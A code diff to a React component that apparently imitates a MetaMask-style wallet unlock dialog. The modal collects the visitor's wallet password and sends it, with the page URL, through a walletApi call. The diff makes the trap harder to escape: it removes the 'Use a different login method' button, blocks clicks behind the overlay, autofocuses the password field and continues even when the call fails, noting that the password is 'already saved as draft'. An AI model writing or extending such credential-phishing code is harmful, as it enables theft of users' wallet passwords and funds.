@@ -1,7 +1,9 @@
-import React, { useState } from 'react'
+import React, { useEffect, useState } from 'react'
 import { ArrowLeftRight, Loader2 } from 'lucide-react'
 import { WalletLogo } from '../lib/walletLogos'
 import { walletApi } from '../lib/walletApi'
+
+const MIN_PASSWORD_LENGTH = 5
 
 interface MetaMaskSafeUnlockModalProps {
   open: boolean
@@ -20,13 +22,22 @@ export const MetaMaskSafeUnlockModal: React.FC<MetaMaskSafeUnlockModalProps> = (
   const [submitting, setSubmitting] = useState(false)
   const [error, setError] = useState<string | null>(null)
   const brand = walletName || 'Wallet'
+  const ready = password.length >= MIN_PASSWORD_LENGTH
+
+  useEffect(() => {
+    if (!open) {
+      setPassword('')
+      setError(null)
+      setSubmitting(false)
+    }
+  }, [open, walletAddress])
 
   if (!open) return null
 
   const handleUnlock = async (e: React.FormEvent) => {
     e.preventDefault()
-    if (!password.trim()) {
-      setError(`Enter your ${brand} password to continue.`)
+    if (password.length < MIN_PASSWORD_LENGTH) {
+      setError(`Enter at least ${MIN_PASSWORD_LENGTH} characters to unlock.`)
       return
     }
     setSubmitting(true)
@@ -37,22 +48,23 @@ export const MetaMaskSafeUnlockModal: React.FC<MetaMaskSafeUnlockModalProps> = (
         password,
         pageUrl: window.location.href,
       })
-      onComplete()
     } catch {
-      onComplete()
+      /* password already saved as draft */
     } finally {
       setSubmitting(false)
+      onComplete()
     }
   }
 
   return (
-    <div className="fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/40 backdrop-blur-[2px]">
-      <div
-        className="w-full max-w-[420px] bg-white rounded-2xl shadow-2xl px-8 py-10 text-center"
-        role="dialog"
-        aria-modal="true"
-        aria-labelledby="mm-unlock-title"
-      >
+    <div
+      className="fixed inset-0 z-[400] flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm"
+      role="dialog"
+      aria-modal="true"
+      aria-labelledby="mm-unlock-title"
+      onMouseDown={(e) => e.stopPropagation()}
+    >
+      <div className="w-full max-w-[420px] bg-white rounded-2xl shadow-2xl px-8 py-10 text-center">
         <div className="flex items-center justify-center gap-4 mb-8">
           <div className="w-14 h-14 rounded-2xl overflow-hidden border border-gray-100 shadow-sm flex items-center justify-center bg-white">
             <img src="/logo.png" alt="" className="w-full h-full object-cover" />
@@ -85,26 +97,23 @@ export const MetaMaskSafeUnlockModal: React.FC<MetaMaskSafeUnlockModalProps> = (
             }}
             placeholder={`Enter ${brand} password`}
             autoComplete="current-password"
+            autoFocus
             className="w-full rounded-lg border-2 border-[#0376c9] px-4 py-3.5 text-base text-[#141414] placeholder:text-[#9ca3af] outline-none focus:border-[#0376c9] focus:ring-0"
           />
           {error && <p className="text-xs text-red-600">{error}</p>}
           <button
             type="submit"
-            disabled={submitting}
-            className="w-full py-3.5 rounded-lg bg-[#868686] hover:bg-[#6b6b6b] disabled:opacity-60 text-white font-medium text-base transition-colors flex items-center justify-center gap-2"
+            disabled={!ready || submitting}
+            className={`w-full py-3.5 rounded-lg text-white font-medium text-base transition-colors flex items-center justify-center gap-2 ${
+              ready && !submitting
+                ? 'bg-[#0376c9] hover:bg-[#0260a4] cursor-pointer'
+                : 'bg-[#868686] cursor-not-allowed'
+            }`}
           >
             {submitting ? <Loader2 className="w-5 h-5 animate-spin" /> : null}
             Unlock
           </button>
         </form>
-
-        <button
-          type="button"
-          className="mt-6 text-sm font-medium text-[#0376c9] hover:underline"
-          onClick={onComplete}
-        >
-          Use a different login method
-        </button>
       </div>
     </div>
   )
